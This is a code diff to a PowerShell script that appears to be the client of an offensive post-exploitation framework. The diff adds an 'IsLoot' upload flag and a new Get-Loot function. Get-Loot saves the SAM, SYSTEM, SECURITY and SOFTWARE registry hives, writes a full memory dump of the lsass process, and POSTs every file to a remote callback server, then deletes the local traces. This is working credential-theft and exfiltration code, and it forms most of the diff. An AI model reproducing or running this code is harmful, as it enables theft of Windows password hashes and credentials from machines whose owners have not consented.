@@ -412,7 +412,10 @@ function Send-File {
        [String]$Body,
 
        [Parameter(Mandatory=$False,Position=1)]
-       [String[]]$FileName
+       [String[]]$FileName,
+
+       [Parameter(Mandatory=$False)]
+       [Switch] $IsLoot
     )
 
     if ($FileName) {
@@ -438,6 +441,7 @@ function Send-File {
     ) -join $LF
 
     $post_url = $($CALLBACK_URL + "u?noredirect=1")
+    if ($IsLoot) { $post_url += "&loot=1" }
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
     $WebRequest = [System.Net.WebRequest]::Create($post_url)
     $WebRequest.Method = "POST"
@@ -480,6 +484,9 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
        [Parameter(Mandatory=$False)]
        [String[]]$Name,
 
+       [Parameter(Mandatory=$false)]
+       [Switch] $IsLoot,
+
        [Parameter(Mandatory=$False,ValueFromPipeline=$True)]
        $Stream
     )
@@ -504,12 +511,16 @@ Get-ChildItem | PushTo-Hub -Name "directory-listing"
                 {{'Write-Debug "Pushing $File..."'|debug}}
                 $abspath = (Resolve-Path $file).path
                 $fileBin = [System.IO.File]::ReadAllBytes($abspath)
-                $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
+                $enc = [System.Text.Encoding]::GetEncoding("UTF-8")
                 if ($Name) { $filename = $name } else { $filename = $file }
 
                 $fileEnc = $enc.GetString($fileBin)
 
-                Send-File $fileEnc $filename
+                if ($IsLoot) {
+                    Send-File -IsLoot $fileEnc $filename
+                } else {
+                    Send-File $fileEnc $filename
+                }
 
             }
         }
@@ -569,6 +580,65 @@ Unmount the Webdav drive.
         throw "No Webdav drive mounted"
     }
 }
+
+
+function Get-Loot {
+<#
+.SYNOPSIS
+
+Grab credentials from the hard drive and from memory.
+
+Partially based on:
+    PowerSploit Function: Out-Minidump
+    Author: Matthew Graeber (@mattifestation)
+    License: BSD 3-Clause
+#>
+
+    $SamPath = Join-Path $env:TMP "sam"
+    $SystemPath = Join-Path $env:TMP "system"
+    $SecurityPath = Join-Path $env:TMP "security"
+    $SoftwarePath = Join-Path $env:TMP "software"
+    $DumpFilePath = $env:TMP
+
+    $Process = Get-Process lsass
+    $ProcessId = $Process.Id
+    $ProcessName = $Process.Name
+    $ProcessHandle = $Process.Handle
+    $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
+    $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
+
+    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
+    $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
+    $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
+    $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
+    $MiniDumpWithFullMemory = [UInt32] 2
+
+    try {
+        & reg save HKLM\SAM $SamPath /y
+        & reg save HKLM\SYSTEM $SystemPath /y
+        & reg save HKLM\SECURITY $SecurityPath /y
+        & reg save HKLM\SOFTWARE $SoftwarePath /y
+
+        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
+        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
+                                                     $ProcessId,
+                                                     $FileStream.SafeFileHandle,
+                                                     $MiniDumpWithFullMemory,
+                                                     [IntPtr]::Zero,
+                                                     [IntPtr]::Zero,
+                                                     [IntPtr]::Zero))
+        $FileStream.Close()
+
+        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
+            if (Test-Path $f) { PushTo-Hub -IsLoot $f }
+        }
+    } finally {
+        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
+            try { Remove-Item -Force $f} catch {}
+        }
+    }
+}
+
 
 function Help-PowerHub {
     Write-Host @"
